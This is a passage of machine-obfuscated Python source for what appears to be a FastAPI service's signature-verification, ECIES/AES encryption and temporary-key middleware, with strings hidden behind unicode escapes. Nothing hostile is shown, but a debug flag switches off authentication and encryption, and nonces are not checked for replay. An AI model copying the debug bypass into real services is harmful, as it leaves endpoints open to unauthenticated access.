                if len(O0_var_43) > 32 and (not all((O0_var_44 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_44 in O0_var_43))):
                    self.ecies_pubkey = base64.b64decode(O0_var_43)
                else:
                    self.ecies_pubkey = bytes.fromhex(O0_var_43)
            except Exception:
                self.ecies_pubkey = O0_var_43.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_43, str) else O0_var_43
            if len(self.ecies_pubkey) not in (33, 65):
                Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u0020\\u8b66\\u544a\\u003a\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u957f\\u5ea6\\u5f02\\u5e38\\u0020\\u0028', 'unicode_escape') + str(len(self.ecies_pubkey)) + codecs.decode('\\u5b57\\u8282\\u0029\\u002c\\u0020\\u52a0\\u5bc6\\u53ef\\u80fd\\u5931\\u8d25', 'unicode_escape'))

    @staticmethod
    def _load_ecdsa_pubkey(pem_or_der: str) -> VerifyingKey:
        O0_var_45 = pem_or_der.strip()
        if codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape') in O0_var_45:
            try:
                return VerifyingKey.from_pem(O0_var_45)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0050\\u0045\\u004d\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        try:
            O0_var_46 = codecs.decode('', 'unicode_escape').join(O0_var_45.split())
            O0_var_47 = base64.b64decode(O0_var_46, validate=True)
        except (binascii.Error, ValueError):
            O0_var_47 = O0_var_45.encode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u0031', 'unicode_escape'))
        try:
            return VerifyingKey.from_der(O0_var_47)
        except Exception:
            pass
        if len(O0_var_47) in (33, 65) and O0_var_47[0] in (2, 3, 4):
            try:
                return VerifyingKey.from_string(O0_var_47, curve=TEMP_ECDSA_CURVE)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0072\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u002f\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        raise ValueError(codecs.decode('\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006c\\u006f\\u0061\\u0064\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u002e\\u0020\\u0050\\u006c\\u0065\\u0061\\u0073\\u0065\\u0020\\u0063\\u0068\\u0065\\u0063\\u006b\\u003a\\u000a\\u0031\\u002e\\u0020\\u0050\\u0045\\u004d\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u0028\\u0073\\u0074\\u0061\\u0072\\u0074\\u0073\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u0027\\u0029\\u000a\\u0032\\u002e\\u0020\\u0053\\u0074\\u0061\\u006e\\u0064\\u0061\\u0072\\u0064\\u0020\\u0058\\u002e\\u0035\\u0030\\u0039\\u0020\\u0044\\u0045\\u0052\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0033\\u002e\\u0020\\u0052\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u0020\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0033\\u0033\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u006f\\u0072\\u0020\\u0055\\u006e\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0050\\u0072\\u006f\\u0076\\u0069\\u0064\\u0065\\u0064\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0064\\u0029\\u003a\\u0020', 'unicode_escape') + str(len(O0_var_47)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u002e', 'unicode_escape'))

    @staticmethod
    def validate_ecies_pubkey(pubkey_b64: str) -> bytes:
        if not pubkey_b64 or not pubkey_b64.strip():
            raise ValueError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0069\\u0073\\u0020\\u0065\\u006d\\u0070\\u0074\\u0079', 'unicode_escape'))
        O0_var_48 = pubkey_b64.strip()
        try:
            if len(O0_var_48) > 32 and (not all((O0_var_49 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_49 in O0_var_48))):
                O0_var_50 = codecs.decode('', 'unicode_escape').join(O0_var_48.split())
                O0_var_51 = base64.b64decode(O0_var_50, validate=True)
            else:
                O0_var_51 = bytes.fromhex(O0_var_48)
        except Exception as e:
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        if len(O0_var_51) not in (33, 65):
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020', 'unicode_escape') + str(len(O0_var_51)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u003b\\u0020\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0033\\u0033\\u0020\\u006f\\u0072\\u0020\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'))
        return O0_var_51

    def verify_signature(self, nonce: str, O0_var_52: str, O0_var_53: str) -> bool:
        try:
            O0_var_54 = int(O0_var_52)
            O0_var_55 = int(time.time())
            if abs(O0_var_55 - O0_var_54) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_55 - O0_var_54)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_56 = (str(nonce) + str(O0_var_52)).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_57 = hashlib.sha256(O0_var_56)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + str(nonce) + str(O0_var_52))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_57.hexdigest()))
        try:
            O0_var_58 = base64.b64decode(O0_var_53)
            O0_var_59 = len(O0_var_58)
            if O0_var_59 == 64:
                O0_var_60 = sigdecode_string
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            elif O0_var_59 > 64 and O0_var_58[0] == 48:
                O0_var_60 = sigdecode_der
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0044\\u0045\\u0052\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            else:
                O0_var_60 = sigdecode_der
            self.ecdsa_vk.verify(O0_var_58, O0_var_56, hashfunc=hashlib.sha256, sigdecode=O0_var_60)
        except BadSignatureError:
            Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u574f\\u7b7e\\u540d', 'unicode_escape'))
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        return True

    def identify_signer(self, nonce: str, O0_var_61: str, O0_var_62: str, O0_var_63: Optional[VerifyingKey]=None) -> str:
        try:
            O0_var_64 = int(O0_var_61)
            O0_var_65 = int(time.time())
            if abs(O0_var_65 - O0_var_64) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_65 - O0_var_64)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_66 = (str(nonce) + str(O0_var_61)).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_67 = hashlib.sha256(O0_var_66)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + str(nonce) + str(O0_var_61))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_67.hexdigest()))
        if self._verify_with(self.ecdsa_vk, O0_var_62, O0_var_66):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u0028\\u63a7\\u5236\\u7aef\\u9759\\u6001\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')
        if O0_var_63 is not None and self._verify_with(O0_var_63, O0_var_62, O0_var_66):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0074\\u0065\\u006d\\u0070\\u0020\\u0028\\u4e34\\u65f6\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape')
        Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u9759\\u6001\\u5bc6\\u94a5\\u4e0e\\u4e34\\u65f6\\u5bc6\\u94a5\\u5747\\u4e0d\\u5339\\u914d', 'unicode_escape'))
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))

    @staticmethod
    def _verify_with(vk: VerifyingKey, auth_token: str, message: bytes) -> bool:
        try:
            O0_var_68 = base64.b64decode(auth_token)
            O0_var_69 = len(O0_var_68)
            if O0_var_69 == 64:
                O0_var_70 = sigdecode_string
            elif O0_var_69 > 64 and O0_var_68[0] == 48:
                O0_var_70 = sigdecode_der
            else:
                O0_var_70 = sigdecode_der
            vk.verify(O0_var_68, message, hashfunc=hashlib.sha256, sigdecode=O0_var_70)
            return True
        except BadSignatureError:
            return False
        except Exception:
            return False

    def encrypt_response(self, data: Dict[str, Any], O0_var_71: Optional[bytes]=None) -> str:
        O0_var_72 = O0_var_71 or self.ecies_pubkey
        if Config.DEBUG or not O0_var_72:
            return json.dumps(data, ensure_ascii=False, default=str)
        try:
            O0_var_73 = json.dumps(data, ensure_ascii=False, default=str).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
            O0_var_74 = ecies_encrypt(O0_var_72, O0_var_73)
            return base64.b64encode(O0_var_74).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
        except Exception as e:
            O0_var_75 = {codecs.decode('\\u005f\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e), codecs.decode('\\u005f\\u0072\\u0061\\u0077', 'unicode_escape'): data if Config.DEBUG else None}
            return json.dumps(O0_var_75, ensure_ascii=False, default=str)

    def decrypt_data(O0_var_76: str, key: bytes):
        try:
            O0_var_77 = json.loads(base64.b64decode(O0_var_76).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_78 = base64.b64decode(O0_var_77[codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape')])
            O0_var_79 = base64.b64decode(O0_var_77[codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape')])
            O0_var_80 = base64.b64decode(O0_var_77[codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')])
            O0_var_81 = AES.new(key, AES.MODE_GCM, nonce=O0_var_78)
            O0_var_82 = O0_var_81.decrypt_and_verify(O0_var_80, O0_var_79)
            return O0_var_82.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        except ValueError:
            Logger.error(codecs.decode('\\u274c\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff1a\\u6570\\u636e\\u53ef\\u80fd\\u88ab\\u7be1\\u6539\\u6216\\u5bc6\\u94a5\\u9519\\u8bef', 'unicode_escape'))
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u274c\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(e))
            return None
crypto = None

def O0_fn_1():
    global crypto
    if crypto is None:
        crypto = CryptoManager(Config.ECDSA_PUBLIC_KEY_PEM, Config.ECIES_PUBLIC_KEY_PEM)
    return crypto

def _generate_ecies_keypair() -> Tuple[bytes, bytes]:
    try:
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_83 = SECP256k1.order
        while True:
            O0_var_84 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_84, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < O0_var_83:
                O0_var_85 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_84, curve=SECP256k1).get_verifying_key().to_string()
                return (O0_var_84, O0_var_85)
    except Exception:
        pass
    try:
        from ecies.keys import PrivateKey as EciesPrivateKey
        O0_var_86 = EciesPrivateKey(codecs.decode('\\u0073\\u0065\\u0063\\u0070\\u0032\\u0035\\u0036\\u006b\\u0031', 'unicode_escape'))
        return (O0_var_86.secret, O0_var_86.public_key.to_bytes())
    except Exception:
        pass
    try:
        try:
            from ecies.utils import generate_keypair
            O0_var_87, O0_var_88 = generate_keypair()
        except Exception:
            from ecies.utils import generate_eth_key
            O0_var_89 = generate_eth_key()
            O0_var_87, O0_var_88 = (O0_var_89.public_key.to_hex(), O0_var_89.to_hex())
        O0_var_85 = bytes.fromhex(O0_var_87[2:] if O0_var_87.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_87)
        O0_var_90 = bytes.fromhex(O0_var_88[2:] if O0_var_88.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_88)
        return (O0_var_90, O0_var_85)
    except Exception as e:
        raise RuntimeError(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u0070\\u0079\\u0020\\u5bc6\\u94a5\\u751f\\u6210\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
TEMP_ECDSA_CURVE = NIST256p

def _ecdsa_private_pkcs8_pem(O0_var_91: 'SigningKey') -> str:
    try:
        O0_var_92 = O0_var_91.to_der(format=codecs.decode('\\u0070\\u006b\\u0063\\u0073\\u0038', 'unicode_escape'))
    except (TypeError, ValueError):
        return O0_var_91.to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    O0_var_93 = base64.b64encode(O0_var_92).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
    O0_var_94 = codecs.decode('\\u000a', 'unicode_escape').join((O0_var_93[O0_var_95:O0_var_95 + 64] for O0_var_95 in range(0, len(O0_var_93), 64)))
    return codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u000a', 'unicode_escape') + str(O0_var_94) + codecs.decode('\\u000a\\u002d\\u002d\\u002d\\u002d\\u002d\\u0045\\u004e\\u0044\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape')

class TempKeyManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u7ba1\\u7406\\u5668\\u0020\\u0028\\u7ebf\\u7a0b\\u5b89\\u5168\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u540c\\u4e00\\u65f6\\u523b\\u4ec5\\u7ef4\\u62a4\\u4e00\\u4efd\\u6709\\u6548\\u4e34\\u65f6\\u5bc6\\u94a5\\u5bf9\\uff0c\\u907f\\u514d\\u5185\\u90e8\\u591a\\u5934\\u5bc6\\u94a5\\u7ba1\\u7406\\u8d1f\\u62c5\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u6709\\u6548\\u671f\\u5185\\u91cd\\u590d\\u67e5\\u8be2\\u8fd4\\u56de\\u540c\\u4e00\\u5bc6\\u94a5\\u5bf9\\uff1b\\u8fc7\\u671f\\u540e\\u81ea\\u52a8\\u751f\\u6210\\u65b0\\u7684\\u5bc6\\u94a5\\u5bf9\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u4e34\\u65f6\\u6301\\u6709\\u8005\\u003a\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0050\\u002d\\u0032\\u0035\\u0036\\u0020\\u79c1\\u94a5\\u7b7e\\u540d\\u8bf7\\u6c42\\u002c\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u89e3\\u5bc6\\u54cd\\u5e94\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self):
        self._lock = threading.Lock()
        self._key: Optional[Dict[str, Any]] = None

    def get_or_create(self, O0_var_96: int) -> Dict[str, Any]:
        with self._lock:
            if self._key and (not self._is_expired(self._key)):
                return self._key
            self._key = self._generate(O0_var_96)
            Logger.info(codecs.decode('\\U0001f511\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u65b0\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u751f\\u6210\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(self._key['key_id']) + codecs.decode('\\u002c\\u0020\\u6709\\u6548\\u671f\\u0020', 'unicode_escape') + str(O0_var_96) + codecs.decode('\\u0020\\u5c0f\\u65f6', 'unicode_escape'))
            return self._key

    def get_active_ecdsa_vk(self) -> Optional[VerifyingKey]:
        with self._lock:
            if self._key and (not self._is_expired(self._key)):
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'))
            return None

    def get_active_ecies_pub(self) -> Optional[bytes]:
        with self._lock:
            if self._key and (not self._is_expired(self._key)):
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'))
            return None

    def _is_expired(self, key: Dict[str, Any]) -> bool:
        return int(time.time()) >= key[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]

    def _generate(self, O0_var_97: int) -> Dict[str, Any]:
        O0_var_98 = SigningKey.generate(curve=TEMP_ECDSA_CURVE)
        O0_var_99 = _ecdsa_private_pkcs8_pem(O0_var_98)
        O0_var_100 = O0_var_98.get_verifying_key().to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_101, O0_var_102 = _generate_ecies_keypair()
        O0_var_103 = int(time.time())
        O0_var_104 = int(O0_var_97) * 3600
        return {codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape'): secrets.token_hex(8), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_103, codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_103 + O0_var_104, codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape'): O0_var_104, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_99, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_100, codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_101.hex(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_102.hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'): O0_var_98.get_verifying_key(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'): O0_var_102}

class AuthEncryptMiddleware(BaseHTTPMiddleware):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u8ba4\\u8bc1\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u4e2d\\u95f4\\u4ef6\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bf7\\u6c42\\u8fdb\\u5165\\u003a\\u0020\\u9a8c\\u8bc1\\u7b7e\\u540d\\u0020\\u002d\\u003e\\u0020\\u89e3\\u5bc6\\u0020\\u0042\\u006f\\u0064\\u0079\\u0020\\u0028\\u5982\\u679c\\u6807\\u8bb0\\u4e86\\u0020\\u0041\\u0045\\u0053\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u54cd\\u5e94\\u8fd4\\u56de\\u003a\\u0020\\u52a0\\u5bc6\\u0020\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0042\\u006f\\u0064\\u0079\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    async def dispatch(self, request: Request, O0_var_105):
        O0_var_106 = request.headers
        O0_var_107 = request.url.path
        O0_var_108 = [codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
        request.state.is_authenticated = False
        if Config.DEBUG:
            request.state.is_authenticated = True
            return await O0_var_105(request)
        if request.method in [codecs.decode('\\u004f\\u0050\\u0054\\u0049\\u004f\\u004e\\u0053', 'unicode_escape'), codecs.decode('\\u0048\\u0045\\u0041\\u0044', 'unicode_escape')]:
            return await O0_var_105(request)
        O0_var_109 = O0_var_106.get(codecs.decode('\\u0078\\u002d\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
        O0_var_110 = O0_var_106.get(codecs.decode('\\u0078\\u002d\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'))
        O0_var_111 = O0_var_106.get(codecs.decode('\\u0078\\u002d\\u0061\\u0075\\u0074\\u0068\\u002d\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
        if not all([O0_var_109, O0_var_110, O0_var_111]):
            if O0_var_107 in O0_var_108:
                return await O0_var_105(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0061\\u0075\\u0074\\u0068\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')})
        try:
            O0_var_112 = None
